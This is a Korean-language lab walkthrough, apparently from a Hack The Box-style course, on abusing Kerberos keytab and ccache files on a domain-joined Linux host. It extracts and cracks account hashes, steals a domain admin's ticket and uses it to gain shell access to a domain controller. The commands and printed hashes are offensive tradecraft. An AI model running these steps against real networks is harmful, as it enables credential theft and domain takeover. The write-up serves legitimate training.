david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root         841       1  0 02:55 ?        00:00:00 /usr/sbin/sssd -i --logger=files
root        1026     841  0 02:55 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        1058     841  0 02:55 ?        00:00:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        1059     841  0 02:55 ?        00:00:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
root        1330       1  0 03:00 ?        00:00:00 /usr/libexec/sssd/sssd_pac --logger=files --socket-activated
david@i+    9143    8372  0 05:21 pts/0    00:00:00 grep --color=auto -i winbind\|sssd
```

이처럼 현재 도메인에 가입되어있는것을 확인할수있다.

리눅스는 대표적으로 keytab 파일과 ccache 파일로 구분된다.

이중 keytab은 티켓을 발급받는 데 사용할 수 있는 비밀키로 사용된다.

내부에 keytab 파일이 존재하는것을 확인할수잇따:

```bash
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

   131610      4 -rw-------   1 root     root         2694 Aug 20 02:56 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262163      4 -rw-rw-rw-   1 root     root          216 Aug 20 05:20 /opt/specialfiles/carlos.keytab
```

이처럼 현재 carlos.keytab이 존재하였으며, 모든 유저에게 읽기와 쓰기 권한이 존재한다.

keytab은 읽기와 쓰기가 존재하여야 사용할수있다.

따라서 klist를 이용해 keytab 파일 내부에 어떤게 있는지 알수있다:

```bash
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 08/20/2026 05:25:01 carlos@INLANEFREIGHT.HTB
   1 08/20/2026 05:25:01 carlos@INLANEFREIGHT.HTB
   1 08/20/2026 05:25:01 carlos@INLANEFREIGHT.HTB
```

carlos의 keytab임을 확인하였기에 이를 토대로 keytab을 적용시킬수있다:

```bash
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

또한 저방법도있지만, keytabextract.py 을 사용하여 keytab 내부에 해시를 추출할수있다:

```bash
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

이를 토대로 나의 로컬에서 해시를 해독후에 사용이 가능하다:

```bash
$ hashcat -m 1000 'a738f92b3c08b424ec2d99589a9cce60' /usr/share/wordlists/rockyou.txt --show

a738f92b3c08b424ec2d99589a9cce60:Password5
```

이를 토대로 ssh 연결을 통하여 이동이 가능해진다.

내부에서 크론탭을 살펴보면 이런게 존재한다:

```bash
carlos@inlanefreight.htb@linux01:~$ crontab -l

*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

이처럼 kerberos_script_test.sh 파일이 5분마다 자동화 되고있음을 확인할수있다.

.sh 파일을 제대로 보게되면 내부에 svc_뭐시기 유저의 kinit으로 유저의 티켓을 삽입후에 smbclient로 연결을 함을 확인할수잇다:

```bash
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

.script 디렉토리 내부를 보게되면 이처럼 john과 svc뭐시기 유저의 keytab들이 존재함을 확인할수있따:

```bash
carlos@inlanefreight.htb@linux01:~/.scripts$ ls -l

-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 146 Oct  6  2022 john.keytab
-rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 251 Oct  6  2022 kerberos_script_test.sh
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 246 Aug 20 05:35 svc_workstations._all.kt
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  94 Aug 20 05:35 svc_workstations.kt
```

일반 kt파일은 특정 키/일부 encryption type만 들어간 keytab일 가능성이 높다.

따라서 같은 principal의 여러 encryption type/key 엔트리를 전부 포함한 keytab _all.kt 파일을 통하여 py 스크립트를 활용해 추출하였다:

```bash
carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py svc_workstations._all.kt

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
        AES-128 HASH : 3a7e52143531408f39101187acc80677
```

그 이후 해시를 크랙하니 이처럼 Password4 라는 비번을 확보하게 되었다:

```bash
$ hashcat -m 1000 '7247e8d4387e76996ff3f18a34316fdd' /usr/share/wordlists/rockyou.txt --show

7247e8d4387e76996ff3f18a34316fdd:Password4
```

이를 통하여 또 다시 svc_workstations 유저로 ssh이동이 가능하였다.(sudo su - 를 이용하여 root로감)

그리고 방금 말한 ccache은 이미 발급받은 Kerberos 티켓 보관함이라고 보면 편하다.

rebeus로 따지면 dump를 활용해 받아온 티켓이라고 볼수도 있고, 전 로그인할때 krbtgt로 만든 티켓을 보관하고있던 상태라고 보면 된다.

그리고 이 cchache는 대부분 Linux에서는 Kerberos 티켓 자체를 ccache 파일 형태로 /tmp에 저장한다.

따라서 tmp를 보니 안본 친구(juilo) 이 새끼에 존재하는 티켓이 존재함을확인할수잇따:

```bash
root@linux01:/tmp# ls -l

-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Aug 20 06:00 krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Aug 20 06:00 krb5cc_647401106_zCP4vJ
```

추가로 이 ccache 파일은 r 권한만 존재해도 사용이 가능하다.

이 juilo가 어떤놈인지 자세히 보게되면 도메인 어드민이라고 쳐 적혀있다:

```bash
root@linux01:/tmp# id julio@INLANEFREIGHT.HTB

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

따라서 이 ccache 파일을 krb5 변수로 집어넣었따:

```bash
root@linux01:/tmp# export KRB5CCNAME=/tmp/krb5cc_647401106_zCP4vJ
```

kilst를 보게되면 정상적으로 juilo 친구의 티켓으로 들어가있따:

```bash
root@linux01:/tmp# klist

Ticket cache: FILE:/tmp/krb5cc_647401106_zCP4vJ
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
08/20/2026 05:59:37  08/20/2026 15:59:37  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 08/21/2026 05:59:37
```

이를 토대로 //dc01 smb 통신을 활용하여 본 결과 정상적으로 접근에 성공하게된다:

```bash
root@linux01:/tmp# smbclient //DC01/C$ -k -c ls -no-pass

  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Fri Aug 20 02:54:42 2026
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Mon Oct 10 10:48:55 2022
```

또한 위 CCACHE를 로컬에 가져와서 klist에 저장시켜서 dc01에 들어갈수있게된다.

우선 나의 로컬터미널에 넣었다:

```bash
$ export KRB5CCNAME=$(pwd)/krb5cc_647401106_6O1tms
```

klist를 확인해보면 정상적으로 들어간것을 확인할수있다:

```bash
$ klist                                                           
Ticket cache: FILE:/home/kali/krb5cc_647401106_6O1tms
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
08/20/2026 04:04:37  08/20/2026 14:04:37  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 08/21/2026 04:04:37
```

/etc/hosts 파일을 넣고 이처럼 돌리게 되면 pwn3d가 뜬다:

```bash
$ proxychains nxc smb dc01.INLANEFREIGHT.HTB --use-kcache

SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [+] INLANEFREIGHT.HTB\julio from ccache (Pwn3d!)
```

현재 도메인 어드민 관리자이기에 evil을 이용하여 접속에 시도할수있게된다:

```bash
$ proxychains evil-winrm -i dc01.inlanefreight.htb -r INLANEFREIGHT.HTB
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information                                                
Cannot find KDC for realm "INLANEFREIGHT.HTB"                                                                                                                                                                                                               
Error: Exiting with code 1
```

하지만 이런식으로 오류가 뜬다.

왜냐하면 현재 명시된 릴레이가 존재하지않아 INLANEFREIGHT.HTB 이새끼 서버 어딨냐? 를 못찾고있는 상태이기 때문이다.

따라서 krb5.conf 파일을 통하여 릴레이를 지정해주면 도메인이 알아서 가준다:

```bash
$ proxychains nxc smb dc01.INLANEFREIGHT.HTB --use-kcache --generate-krb5-file krb5.conf 

SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [+] INLANEFREIGHT.HTB\julio from ccache (Pwn3d!)
```

이렇게 되게되면 파일이 생성된것을 확인할수잇따:

```conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.INLANEFREIGHT.HTB
        admin_server = dc01.INLANEFREIGHT.HTB
        default_domain = INLANEFREIGHT.HTB
    }

[domain_realm]
    .INLANEFREIGHT.HTB = INLANEFREIGHT.HTB
    INLANEFREIGHT.HTB = INLANEFREIGHT.HTB
```

이 릴레이 파일을 환경변수로 통해 설정해주었다:

```bash
$ export KRB5_CONFIG=$(pwd)/krb5.conf
```

이후 다시 evil에 접속하면 성공적으로 접속하는데 성공하였다:

```bash
$ proxychains evil-winrm -i dc01.inlanefreight.htb -r INLANEFREIGHT.HTB                 

*Evil-WinRM* PS C:\Users\julio\Documents>
```

## Pass the Certificate

